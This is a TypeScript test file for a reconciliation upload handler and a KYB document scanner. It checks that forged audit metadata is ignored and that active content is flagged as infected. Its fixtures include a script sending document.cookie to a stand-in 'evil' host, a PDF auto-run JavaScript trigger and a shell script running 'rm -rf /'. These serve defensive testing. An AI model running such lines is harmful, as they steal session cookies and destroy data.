import { describe, expect, test } from "bun:test";
import { createReconciliationUploadHandler } from "../../api/internal/reconciliationUpload";
import { scanKybBytes } from "../../lib/kybScan";

type Audit = { actorId: string; role: string; action: string };

const fakeObjectStorage = {
  routeClient: {
    stageUpload: async (input: { data: Uint8Array }) => ({
      objectId: "00000000-0000-4000-8000-000000000001",
      bucket: "HOT",
      storageKey: "recon_statements/shared/2026/11/statement.v1.enc",
      sha256Hex: "",
      byteSize: BigInt(input.data.byteLength),
      detectedMimeType: "text/csv",
      requiresAsyncAvScan: false,
    }),
    bind: async () => undefined,
    discardStaged: async () => undefined,
  },
} as never;

const buildUpload = (existingRun: Record<string, unknown> | null = null) => {
  const audits: Audit[] = [];
  const db: any = {
    auditLog: { create: async (args: { data: Audit }) => { audits.push(args.data); return { id: "a1" }; } },
    $transaction: async (fn: (tx: unknown) => unknown) => fn({ auditLog: db.auditLog }),
  };
  const repositories: any = {
    reconciliation: {
      findStatementSourceById: async () => ({ id: "src" }),
      findRunByFileHash: async () => existingRun,
      createRun: async () => ({ id: "run1" }),
    },
    jobs: { findLiveJobForReference: async () => null, enqueueJob: async () => ({ id: "job1" }) },
  };
  const handler = createReconciliationUploadHandler({ db, repositories, objectStorage: fakeObjectStorage });
  const call = async (principal: unknown, headers: Record<string, string> = {}) => {
    const meta = Buffer.from(JSON.stringify({ actorId: "FORGED-CFO-ID", actorRole: "MLRO", checklist: ["x"] })).toString("base64url");
    const request: any = {
      body: Buffer.from("a,b\n1,2\n"),
      headers: { "x-statement-source-id": "src", "x-upload-metadata": meta, ...headers },
      principal,
    };
    const sent: { status?: number; body?: unknown } = {};
    const response: any = {
      status(code: number) { sent.status = code; return this; },
      json(payload: unknown) { sent.body = payload; return this; },
    };
    await handler(request, response);
    return sent;
  };
  return { audits, call };
};

describe("M9 reconciliation upload audit actor", () => {
  test("the audit actor and role come from the authenticated principal, not from x-upload-metadata", async () => {
    const { audits, call } = buildUpload();
    const sent = await call({ userId: "real-user", role: "FINANCE" });
    expect(sent.status).toBe(202);
    const audit = audits.find((entry) => entry.action === "RECONCILIATION_UPLOAD_CHECKLIST");
    expect(audit?.actorId).toBe("real-user");
    expect(audit?.role).toBe("FINANCE");
  });

  test("an upload without an authenticated staff principal is refused and leaves no audit row", async () => {
    const { audits, call } = buildUpload();
    await expect(call(undefined)).rejects.toMatchObject({ statusCode: 401, code: "AUTH_REQUIRED" });
    expect(audits).toHaveLength(0);
  });

  test("a file hash that already belongs to another statement source is never answered with that source's run", async () => {
    const { call } = buildUpload({ id: "other-run", statementSourceId: "another-source" });
    await expect(call({ userId: "real-user", role: "FINANCE" })).rejects.toMatchObject({
      statusCode: 409,
      code: "STATEMENT_FILE_HASH_CONFLICT",
    });
  });
});

describe("M12 KYB scan fails closed", () => {
  const active: Record<string, Buffer> = {
    "HTML with a script": Buffer.from("<html><script>fetch('//evil/'+document.cookie)</script></html>"),
    "SVG": Buffer.from('<svg xmlns="http://www.w3.org/2000/svg"><rect/></svg>'),
    "PDF with /JS and /OpenAction": Buffer.from("%PDF-1.4\n1 0 obj<</OpenAction<</S/JavaScript/JS(app.alert(1))>>>>endobj"),
    "Windows executable header": Buffer.concat([Buffer.from("MZ"), Buffer.alloc(64)]),
    "ELF executable header": Buffer.concat([Buffer.from([0x7f, 0x45, 0x4c, 0x46]), Buffer.alloc(64)]),
    "shebang script": Buffer.from("#!/bin/sh\nrm -rf /\n"),
  };
  for (const [name, bytes] of Object.entries(active)) {
    test(`active content is INFECTED in every mode: ${name}`, () => {
      for (const mode of [undefined, "disabled", "eicar"]) {
        expect(scanKybBytes(bytes, mode)).toBe("INFECTED");
      }
    });
  }

  test("the default mode never returns CLEAN: files stay PENDING until a scanner mode is configured", () => {
    const png = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 1, 2, 3]);
    expect(scanKybBytes(png, undefined)).toBe("PENDING");
    expect(scanKybBytes(png, "disabled")).toBe("PENDING");
    expect(scanKybBytes(png, "some-unknown-mode")).toBe("PENDING");
    expect(scanKybBytes(Buffer.from([0, 1, 2, 3, 250, 251]), undefined)).toBe("PENDING");
  });

  test("only the explicit eicar dev mode marks a clean file CLEAN, and EICAR is always detected", () => {
    const png = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 1, 2, 3]);
    expect(scanKybBytes(png, "eicar")).toBe("CLEAN");
    expect(scanKybBytes(Buffer.from("EICAR-STANDARD-ANTIVIRUS-TEST-FILE"), undefined)).toBe("INFECTED");
    expect(scanKybBytes(Buffer.from("EICAR-STANDARD-ANTIVIRUS-TEST-FILE"), "eicar")).toBe("INFECTED");
  });
});
